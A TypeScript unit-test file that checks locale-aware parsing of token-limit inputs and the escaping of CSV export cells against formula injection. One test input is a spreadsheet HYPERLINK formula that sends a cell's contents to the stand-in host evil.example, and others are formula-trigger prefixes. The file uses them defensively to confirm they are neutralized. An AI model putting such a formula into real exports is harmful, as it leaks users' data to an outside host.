import { describe, expect, test } from "vitest";
import { escapeCsvCell, formatTokenLimit, parseTokenLimit } from "./team-utils";

describe("Max Mode token limit inputs", () => {
  test.each(["de-DE", "pt-BR", "de-CH", "fr-FR", "en-US", "en-IN", "ja-JP"])(
    "the shown value saves back unchanged in %s",
    (locale) => {
      for (const value of [0, 200_000, 500_000, 1_000_000]) {
        expect(parseTokenLimit(formatTokenLimit(value), locale)).toBe(value);
      }
    },
  );

  test.each([
    ["500.000", "de-DE", 500_000],
    ["1.000.000", "de-DE", 1_000_000],
    ["500,000", "en-US", 500_000],
    ["5,00,000", "en-IN", 500_000],
    ["500’000", "de-CH", 500_000],
    ["500 000", "fr-FR", 500_000],
    ["500 000", "en-US", 500_000],
  ])("%j typed in %s is %i", (value, locale, expected) => {
    expect(parseTokenLimit(value, locale)).toBe(expected);
  });

  // A separator that is not the locale's grouping is rejected, never read as 500.
  test.each([
    ["500.000", "en-US"],
    ["500,000", "de-DE"],
    ["1.5", "en-US"],
    ["-5", "en-US"],
    ["1e6", "en-US"],
    ["abc", "en-US"],
  ])("%j typed in %s is rejected", (value, locale) => {
    expect(parseTokenLimit(value, locale)).toBeUndefined();
  });

  test("a blank field means unlimited", () => {
    expect(formatTokenLimit(null)).toBe("");
    expect(parseTokenLimit("  ", "en-US")).toBeNull();
  });
});

describe("Max Mode CSV export", () => {
  test.each([
    '=HYPERLINK("https://evil.example/?d="&B3,"Open report")',
    "+1",
    "-2+3",
    "@SUM(A1:A9)",
    "\t=1+1",
    "\r=1+1",
  ])("neutralizes the formula in %j", (name) => {
    expect(escapeCsvCell(name)).toBe(`"'${name.replaceAll('"', '""')}"`);
  });

  test("leaves ordinary text and numbers unchanged", () => {
    expect(escapeCsvCell('Alice "Al" Smith')).toBe('"Alice ""Al"" Smith"');
    expect(escapeCsvCell("alice@example.com")).toBe('"alice@example.com"');
    expect(escapeCsvCell(-5)).toBe('"-5"');
    expect(escapeCsvCell(null)).toBe('""');
    expect(escapeCsvCell(undefined)).toBe('""');
  });
});
